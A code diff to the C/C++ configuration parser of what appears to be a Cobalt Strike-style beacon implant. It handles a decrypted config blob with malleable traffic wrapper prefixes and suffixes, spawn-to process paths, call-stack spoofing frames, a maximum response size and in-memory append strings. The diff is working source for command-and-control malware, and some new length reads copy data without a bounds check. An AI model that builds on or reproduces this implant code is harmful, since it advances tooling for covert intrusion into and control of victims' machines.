@@ -65,18 +65,20 @@ static void cleanupMalleableBlock(PCFG_ChannelMalleable* mcfg) {
 
 static size_t parseMalleableBlock(const uint8_t* data, size_t data_len, PCFG_ChannelMalleable* mcfg) {
     size_t offset = 0;
-    if (offset + 2 > data_len) return 0;
+    if (offset + 4 > data_len) return 0;
 
-    // Wrapper prefix
-    uint8_t prefix_len = data[offset++];
+    // Wrapper prefix (uint16_t LE)
+    uint16_t prefix_len = data[offset] | (data[offset + 1] << 8);
+    offset += 2;
     mcfg->wrapper_prefix = allocString(data + offset, prefix_len);
     if (!mcfg->wrapper_prefix) { cleanupMalleableBlock(mcfg); return 0; }
     mcfg->wrapper_prefix_len = prefix_len;
     offset += prefix_len;
 
-    // Wrapper suffix
-    if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
-    uint8_t suffix_len = data[offset++];
+    // Wrapper suffix (uint16_t LE)
+    if (offset + 2 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
+    uint16_t suffix_len = data[offset] | (data[offset + 1] << 8);
+    offset += 2;
     mcfg->wrapper_suffix = allocString(data + offset, suffix_len);
     if (!mcfg->wrapper_suffix) { cleanupMalleableBlock(mcfg); return 0; }
     mcfg->wrapper_suffix_len = suffix_len;
@@ -299,6 +301,16 @@ void freeConfig(BeaconConfig* config) {
         __free(config->stack_chain);
         config->stack_chain = nullptr;
     }
+
+    // Free in-memory append strings
+    if (config->in_memory_append) {
+        for (uint8_t i = 0; i < config->in_memory_append_count; i++) {
+            freeStr(config->in_memory_append[i]);
+        }
+        __free(config->in_memory_append);
+        config->in_memory_append = nullptr;
+        config->in_memory_append_count = 0;
+    }
 }
 
 /* ============================================================================
@@ -487,6 +499,17 @@ bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_
             config->num_spoof_frames = 0;
         }
 
+        // --- Read max_response_size (4 bytes) ---
+        if (offset + 4 <= payload_len) {
+            config->max_response_size = (uint32_t)decrypted[offset]
+                | ((uint32_t)decrypted[offset + 1] << 8)
+                | ((uint32_t)decrypted[offset + 2] << 16)
+                | ((uint32_t)decrypted[offset + 3] << 24);
+            offset += 4;
+        } else {
+            config->max_response_size = 67108864;  // 64MB default
+        }
+
         // --- Read spawnto_x64 (len + string) ---
         config->spawnto_x64 = nullptr;
         config->spawnto_x64_len = 0;
@@ -602,6 +625,28 @@ bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_
                         uint8_t fnLen = decrypted[offset++];
                         e->function = allocString(decrypted + offset, fnLen);
                         offset += fnLen;
+                    }
+                }
+            }
+        }
+
+        // --- Read in-memory append strings (1 byte count + per-string len(2) + data) ---
+        config->in_memory_append_count = 0;
+        config->in_memory_append = nullptr;
+        if (offset + 1 <= payload_len) {
+            uint8_t imCount = decrypted[offset++];
+            if (imCount > 0 && imCount <= 64) {
+                config->in_memory_append = (char**)__malloc(sizeof(char*) * imCount);
+                if (config->in_memory_append) {
+                    config->in_memory_append_count = imCount;
+                    for (uint8_t i = 0; i < imCount; i++) {
+                        config->in_memory_append[i] = nullptr;
+                        if (offset + 2 > payload_len) break;
+                        uint16_t strLen = decrypted[offset] | (decrypted[offset + 1] << 8);
+                        offset += 2;
+                        if (offset + strLen > payload_len) break;
+                        config->in_memory_append[i] = allocString(decrypted + offset, strLen);
+                        offset += strLen;
                     }
                 }
             }
